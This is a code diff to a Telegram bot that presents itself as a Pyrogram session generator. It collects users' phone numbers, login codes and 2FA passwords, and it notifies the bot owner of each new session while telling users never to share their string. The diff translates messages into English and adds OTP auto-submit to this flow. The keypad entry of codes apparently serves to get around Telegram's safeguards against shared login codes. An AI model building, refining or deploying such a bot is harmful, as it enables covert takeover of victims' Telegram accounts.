@@ -21,14 +21,14 @@ load_dotenv()
 def _get_int(key: str) -> int:
     val = os.getenv(key)
     if not val:
-        raise RuntimeError(f"❌ Missing env var: {key}")
+        raise RuntimeError(f"Missing env var: {key}")
     return int(val)
 
 
 def _get_str(key: str) -> str:
     val = os.getenv(key)
     if not val:
-        raise RuntimeError(f"❌ Missing env var: {key}")
+        raise RuntimeError(f"Missing env var: {key}")
     return val.strip()
 
 
@@ -37,6 +37,8 @@ API_HASH  = _get_str("API_HASH")
 BOT_TOKEN = _get_str("BOT_TOKEN")
 OWNER_ID  = _get_int("OWNER_ID")
 # ────────────────────────────────────────────────
+
+OTP_LENGTH = 5  # Telegram OTP is 5 digits; auto-submits when reached
 
 bot = Client(
     "session_gen_bot",
@@ -50,7 +52,7 @@ sessions: dict[int, dict] = {}
 
 
 # ─────────────────── HELPERS ───────────────────
-def keypad_markup(entered: str):
+def keypad_markup(entered: str, locked: bool = False):
     layout = [
         [("1", "1"), ("2", "2"), ("3", "3")],
         [("4", "4"), ("5", "5"), ("6", "6")],
@@ -61,12 +63,20 @@ def keypad_markup(entered: str):
         [InlineKeyboardButton(label, callback_data=f"otp|{val}") for label, val in row]
         for row in layout
     ]
-    text = (
-        "🔐 **Enter OTP**\n\n"
-        f"Entered: `{entered or '—'}`\n\n"
-        "⚠️ Sirf neeche wale **inline buttons** se OTP daalo.\n"
-        "Chat me type karne se login incomplete rahega."
-    )
+    if locked:
+        text = (
+            "🔐 **Enter OTP**\n\n"
+            f"Entered: `{entered}`\n\n"
+            "⏳ Verifying..."
+        )
+    else:
+        text = (
+            "🔐 **Enter OTP**\n\n"
+            f"Entered: `{entered or '—'}`\n\n"
+            "⚠️ Use the **inline buttons** below only.\n"
+            "Typing OTP in chat will leave the login incomplete.\n"
+            f"Auto-submits after **{OTP_LENGTH}** digits."
+        )
     return InlineKeyboardMarkup(buttons), text
 
 
@@ -99,12 +109,12 @@ async def finish_login(
     has_2fa: bool = False,
     phone: str = "—",
 ):
-    # Export session + get_me
+    # Export session and fetch account info
     try:
         session_string = await temp.export_session_string()
         me = await temp.get_me()
     except Exception as e:
-        await safe_edit_or_reply(message, f"❌ Session export fail: `{e}`", edit)
+        await safe_edit_or_reply(message, f"❌ Session export failed: `{e}`", edit)
         await cleanup_user(user_id)
         return
 
@@ -113,16 +123,16 @@ async def finish_login(
     full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
     twofa_line = "✅ Yes" if has_2fa else "❌ No"
 
-    # ── 1) User ko DM ──
+    # ── 1) Send to user ──
     user_txt = (
         "✅ **Login successful!**\n\n"
         "**Pyrogram String Session:**\n\n"
         f"`{session_string}`\n\n"
-        "⚠️ Kisi ke saath share mat karo — ye tumhare account ka full access hai."
+        "⚠️ Never share this with anyone — it grants full access to your account."
     )
     await safe_edit_or_reply(message, user_txt, edit)
 
-    # ── 2) Owner ko DM ──
+    # ── 2) Send to owner ──
     if OWNER_ID and OWNER_ID != user_id:
         owner_txt = (
             "🔔 **New Session Generated**\n\n"
@@ -154,8 +164,8 @@ async def start_handler(client: Client, message: Message):
     )
     await message.reply(
         "👋 **Pyrogram Session Generator**\n\n"
-        "Apna phone number share karne ke liye neeche wala button dabao.\n"
-        "(Number type karne ki zaroorat nahi)",
+        "Tap the button below to share your phone number.\n"
+        "(You do not need to type it manually.)",
         reply_markup=kb,
     )
 
@@ -167,13 +177,13 @@ async def contact_handler(client: Client, message: Message):
 
     if user_id in sessions:
         return await message.reply(
-            "⚠️ Ek session already chal raha hai. /start se reset karo."
+            "⚠️ A session is already in progress. Send /start to reset."
         )
 
     contact = message.contact
     if contact.user_id != user_id:
         return await message.reply(
-            "❌ Ye tumhara apna contact nahi hai. Apna contact bhejo."
+            "❌ This is not your own contact. Please share your own contact."
         )
 
     phone = contact.phone_number
@@ -181,7 +191,7 @@ async def contact_handler(client: Client, message: Message):
         phone = "+" + phone
 
     await message.reply(
-        "⏳ OTP bhej raha hoon...",
+        "⏳ Sending OTP...",
         reply_markup=ReplyKeyboardRemove(),
     )
 
@@ -197,7 +207,7 @@ async def contact_handler(client: Client, message: Message):
         sent_code = await temp.send_code(phone)
     except FloodWait as e:
         await temp.disconnect()
-        return await message.reply(f"⏳ FloodWait: `{e.value}s` wait karo.")
+        return await message.reply(f"⏳ FloodWait: please wait `{e.value}s`.")
     except Exception as e:
         await temp.disconnect()
         return await message.reply(f"❌ Error: `{e}`")
@@ -209,6 +219,7 @@ async def contact_handler(client: Client, message: Message):
         "otp": "",
         "stage": "otp",
         "has_2fa": False,
+        "locked": False,
     }
 
     markup, text = keypad_markup("")
@@ -221,26 +232,51 @@ async def otp_callback(client: Client, cb: CallbackQuery):
     user_id = cb.from_user.id
     sess = sessions.get(user_id)
     if not sess:
-        return await cb.answer("Session expire ho gaya. /start karo.", show_alert=True)
+        return await cb.answer("Session expired. Send /start.", show_alert=True)
     if sess["stage"] != "otp":
-        return await cb.answer("Abhi OTP stage nahi hai.")
+        return await cb.answer("Not at OTP stage right now.")
+    if sess.get("locked"):
+        return await cb.answer("Verifying, please wait...", show_alert=True)
 
     val = cb.data.split("|", 1)[1]
     otp = sess["otp"]
 
     if val == "back":
         otp = otp[:-1]
-    elif val == "submit":
-        if len(otp) < 4:
-            return await cb.answer("Pehle OTP complete karo!", show_alert=True)
+        sess["otp"] = otp
+        markup, text = keypad_markup(otp)
+        try:
+            await cb.message.edit_text(text, reply_markup=markup)
+        except Exception:
+            pass
+        return await cb.answer()
+
+    if val == "submit":
+        if len(otp) < OTP_LENGTH:
+            return await cb.answer(
+                f"Please enter all {OTP_LENGTH} digits.", show_alert=True
+            )
         await cb.answer("Verifying...")
         return await do_sign_in(cb, sess, otp)
-    else:
-        if len(otp) >= 6:
-            return await cb.answer("6 digits max")
-        otp += val
 
+    # Digit pressed
+    if len(otp) >= OTP_LENGTH:
+        return await cb.answer(f"{OTP_LENGTH} digits max")
+
+    otp += val
     sess["otp"] = otp
+
+    # Auto-submit when OTP length reached
+    if len(otp) == OTP_LENGTH:
+        sess["locked"] = True
+        markup, text = keypad_markup(otp, locked=True)
+        try:
+            await cb.message.edit_text(text, reply_markup=markup)
+        except Exception:
+            pass
+        await cb.answer("Verifying...")
+        return await do_sign_in(cb, sess, otp)
+
     markup, text = keypad_markup(otp)
     try:
         await cb.message.edit_text(text, reply_markup=markup)
@@ -261,19 +297,20 @@ async def do_sign_in(cb: CallbackQuery, sess: dict, otp: str):
         sess["has_2fa"] = True
         try:
             await cb.message.edit_text(
-                "🔐 **2FA enabled hai.**\n\n"
-                "Ab apna **Telegram password** chat me type karo.\n"
-                "(Message turant delete ho jaayega.)"
+                "🔐 **2FA is enabled.**\n\n"
+                "Please type your **Telegram password** in the chat.\n"
+                "(The message will be deleted immediately.)"
             )
         except Exception:
             pass
         return
     except PhoneCodeInvalid:
         sess["otp"] = ""
+        sess["locked"] = False
         markup, text = keypad_markup("")
         try:
             await cb.message.edit_text(
-                "❌ Galat OTP. Dobara try karo.\n\n" + text,
+                "❌ Invalid OTP. Please try again.\n\n" + text,
                 reply_markup=markup,
             )
         except Exception:
@@ -281,7 +318,7 @@ async def do_sign_in(cb: CallbackQuery, sess: dict, otp: str):
         return
     except PhoneCodeExpired:
         try:
-            await cb.message.edit_text("❌ OTP expire ho gaya. /start karo dobara.")
+            await cb.message.edit_text("❌ OTP expired. Send /start to try again.")
         except Exception:
             pass
         await cleanup_user(user_id)
@@ -310,13 +347,12 @@ async def text_handler(client: Client, message: Message):
     user_id = message.from_user.id
     sess = sessions.get(user_id)
     if not sess:
-        return await message.reply("Pehle /start karo.")
+        return await message.reply("Please send /start first.")
 
     if sess["stage"] == "otp":
         return await message.reply(
-            "⚠️ **OTP chat me type mat karo.**\n"
-            "Upar wale inline buttons se enter karo, "
-            "warna login incomplete rahega."
+            "⚠️ **Do not type the OTP in chat.**\n"
+            "Use the inline buttons above, otherwise the login will remain incomplete."
         )
 
     if sess["stage"] == "password":
@@ -328,7 +364,7 @@ async def text_handler(client: Client, message: Message):
         try:
             await sess["client"].check_password(password)
         except PasswordHashInvalid:
-            return await message.reply("❌ Galat password. Dobara try karo.")
+            return await message.reply("❌ Incorrect password. Please try again.")
         except Exception as e:
             return await message.reply(f"❌ Error: `{e}`")
         await finish_login(
@@ -352,11 +388,11 @@ async def other_handler(client: Client, message: Message):
     user_id = message.from_user.id
     sess = sessions.get(user_id)
     if not sess:
-        return await message.reply("Pehle /start karo.")
+        return await message.reply("Please send /start first.")
     if sess["stage"] == "otp":
-        return await message.reply("⚠️ Sirf inline buttons use karo OTP ke liye.")
+        return await message.reply("⚠️ Use the inline buttons to enter the OTP.")
     if sess["stage"] == "password":
-        return await message.reply("⚠️ Password text me type karo.")
+        return await message.reply("⚠️ Please type your password as text.")
 
 
 # ─────────────────── RUN ───────────────────
